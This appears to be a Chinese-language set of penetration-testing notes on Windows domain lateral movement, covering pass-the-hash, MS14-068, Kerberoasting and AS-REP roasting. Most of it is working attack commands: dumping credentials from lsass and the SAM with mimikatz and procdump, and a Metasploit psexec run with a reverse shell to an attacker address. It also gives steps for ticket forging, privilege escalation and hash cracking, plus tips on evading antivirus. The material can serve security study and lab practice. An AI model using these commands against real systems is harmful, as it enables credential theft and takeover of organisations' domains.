# 横向移动
## PTH
如果找到了某个用户的ntlm hash，就可以拿这个ntlm hash当作凭证进行远程登陆了  
其中若hash加密方式是 rc4 ，那么就是pass the hash  
若加密方式是aes key,那么就是pass the key  
注意NTLM和kerberos协议均存在PTH:  
NTLM自然不用多说  
kerberos协议也是基于用户的client hash开始一步步认证的，自然也会受PTH影响
那前提就是要获取hash值了
### HASH获取
1.使用meterpreter里的mimikatz模块
    meterpreter>load mimikatz
    meterpreter>mimikatz_command -f mimikatz的指令
    privilege::debug 提权  samdump::hashes dump哈希  
    或者
    meterpreter>msv/kerberos/widgst
2.使用meterpreter自带的hash获取模块
    meterpreter>hashdump
    meterpreter>run windows/gather/smart_hashdump   (推荐使用这个)
3.向目标机上传mimikatz远程调用mimikatz.exe dump出hash，mimikatz需要免杀处理  
意思就是既然我们获取到了shell，我们直接向目标机上传一个mimikatz然后在shell里使用它就行了.
使用方法为cmd窗口打开mimikatz.exe，进入mimikatz终端，然后输入mimikatz指令即可
4.上传procdump到目标机，获取到lsass.dmp文件后将其传回本地又mimikatz来dump哈希
procdump.exe是微软自带的程序，所以不会触发杀毒。所以可以通过它传回lsass.dmp本地提取hash
    procdump64.exe -accepteula -ma lsass.exe lsass.dmp  执行该指令，获取到lsass.dmp
    然后将其传回本地
    通过mimikatz.exe分别执行以下命令
    "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full"
[Procdump](https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump)：  
[mimikatz](https://github.com/gentilkiwi/mimikatz/releases)：
5.使用cobalt strike 获取hash
    beacon>hashdump
    beacon>mimikatz mimikatz指令
6.利用sam表
mimikatz在线读sam表中的hash
    privilege::debug
    token::elevate
    lsadump::sam
将sam表下载到本地由mimikatz分析
    reg save HKLM\SYSTEM SYSTEM
    reg save HKLM\SAM SAM
    在远端shell使用以上命令导出SYSTEM 和 SAM文件，并将其待会本地，由mimikatz分析
    mimikatz运行
    mimikatz # lsadump::sam /sam:SAM /system:SYSTEM
    Domain : STU1
    SysKey : fd4639f4e27c79683ae9fee56b44393f
    Local SID : S-1-5-21-1982601180-2087634876-2293013296
    SAMKey : 099d1915db1b0e5cf41f1f0908dc7e17
    RID  : 000001f4 (500)
    User : Administrator
      Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0
    RID  : 000001f5 (501)
    User : Guest
    RID  : 000003e8 (1000)
    User : liukaifeng01
      Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0
### hash 传递攻击 PTH （Pass the Hash)
1.msf里使用psexec模块
    msf5 exploit(multi/handler) > use exploit/windows/smb/psexec  //以root启动msf
    [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
    msf5 exploit(windows/smb/psexec) > set lhsot 192.168.64.133
    lhsot => 192.168.64.133
    msf5 exploit(windows/smb/psexec) > set lhost 192.168.64.133
    lhost => 192.168.64.133
    msf5 exploit(windows/smb/psexec) > set lport 443
    lport => 443
    msf5 exploit(windows/smb/psexec) > set rhost 192.168.52.138
    rhost => 192.168.52.138
    msf5 exploit(windows/smb/psexec) > set SMBUser Administrator
    SMBUser => Administrator
    msf5 exploit(windows/smb/psexec) > set SMBPass 8a963371a63944419ec1adf687bb1be5  //一般选择NTLM HASH
    SMBPass => 8a963371a63944419ec1adf687bb1be5
    msf5 exploit(windows/smb/psexec) > run
2.使用mimikatz
我们在目标机里放置mimikatz.exe 然后执行以下命令
    sekurlsa::pth /user:administrator /domain:"xxx.com" /ntlm:6542d35ed5ff6ae5e75b875068c5d3bc  //自行修改
之后便会弹出一个cmd窗口，在这个窗口里链接机器即可
    net use \\192.168.222.131\c$
3.使用cobalt strike
在cobalt strike里找到域控，然后使用psexec模块，选择一个本地hash即可。
## MS14-068
这个洞的危害很大，可以让任意域用户提权到域管。  
适用版本: server 2000以上  
补丁: kb3011780
### M14068利用
1.工具kekeo[
https://github.com/gentilkiwi/kekeo/releases/tag/2.2.0-20200718](https://github.com/gentilkiwi/kekeo/releases/tag/2.2.0-20200718)
具体方法为，在kekeo里先执行 kerberos::purge清空票据  
然后再执行 exploit::ms14068 /user:xxx /password:xxx /domain:xxx /ptt  
即可。
然后就dir \域控\c$ 试试，如果可以就说明提权成功了（不是每次都能成功的)
2.golenpac 
这个工具好用,
执行类似上述命令，就能返回一个域控的 system权限的cmd shell回来，感觉蛮好用  
另外在最后指定域控机器时，可以指定域控以外的机器并获取他们的本地system权限用户.  
但返回的似乎不是域控？
## kerberoast
Kerberoast攻击原理: 攻击者从 TGS-REP 中提取加密的服务票证。 由于服务票证是用链接到请求 SPN
的帐户的哈希加密的，所以攻击者可以离线破解这个加密块，恢复帐户的明文密码
### How to get SPN
如何得到域中的所有SPN？
**1.setspn**  
很简单，只需执行
    setspn -q */*
即可
**2.kerberoast工具集的GetUserSpns powershell脚本**
### How to get HASH
如何得到hash？  
有如下方法
**1.Rubeus.exe**
这个工具github上就有，但是clone下来后需要自己编译成exe.
然后执行 Rubeus.exe kerberoast指令即可
**2.mimikatz**
mimikatz真的神器。  
通过命令 kerberos::ask /target:你所指定的SPN,
即可通过认证的方式得到一个ST。  
然后我们在kerberos::list里可以看到我们想要的ST
**3.powershell**
越来越发现powershell在域渗透中的重要性了  
输入以下指令，即可完成HASH获取
    Add-Type -AssemblyName System.IdentityModel
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MySQL/win7.xie.com:3306/MySQL"
然后mimikatz导出即可
### How to export hash
获得了ST票据，但怎么导出？
**1.mimikatz**
导出所有票据
可以发现生成了kirbi文件。这就是我们所需要的hash了
**2.Empire Powershell 框架**
github:
我们通过这个框架可以导出hashcat格式的hash.
    Import-Module .\Invoke-Kerberoast.ps1;Invoke-Kerberoast -outputFormat Hashcat
### How to crack HASH
如何破解HASH?
**1.HASHCAT**
这个工具需要让hash格式为hashcat模式才能进行破解。kribi文件不能放入hashcat进行破解.
    hashcat -m 13110 pass.txt hash.txt
**2.kerberoast中的tgsrepcrack.py**
支持kribi文件破解
    python3 tgsrepcrack.py pass.txt xxx.kribi
### How to use Kerberoast
既然我们都把ST的加密hash都破解了，那么我们就可以随便改ST中的票据内容了..\ 这里使用的是kerberoast工具集里的kerberoast.py
    python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -u 500
    python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -g 512
    ## 将票据权限改为administrator
    kerberos::ptt PENTESTLAB.kirbi  #将票据注入到内存
## AS_REP Roast
较Kerberoast来说，比较鸡肋。  
它的原理是在不开启kerberos预身份验证的前提下，获得其他用户的AS_RES，并破解加密session key 的 client hash。
### How to get HASH
**1.Rubeus**
    Rubeus.exe asreproast
然后就会搜索域中不需要kerberos预验证的用户，并获得ASREP。
**2.Empire框架与 ASREPRoast.ps1**
使用Empire框架下的powerview.ps1查找域中设置了 “不需要kerberos预身份验证” 的用户
    Import-Module .\powerview.ps1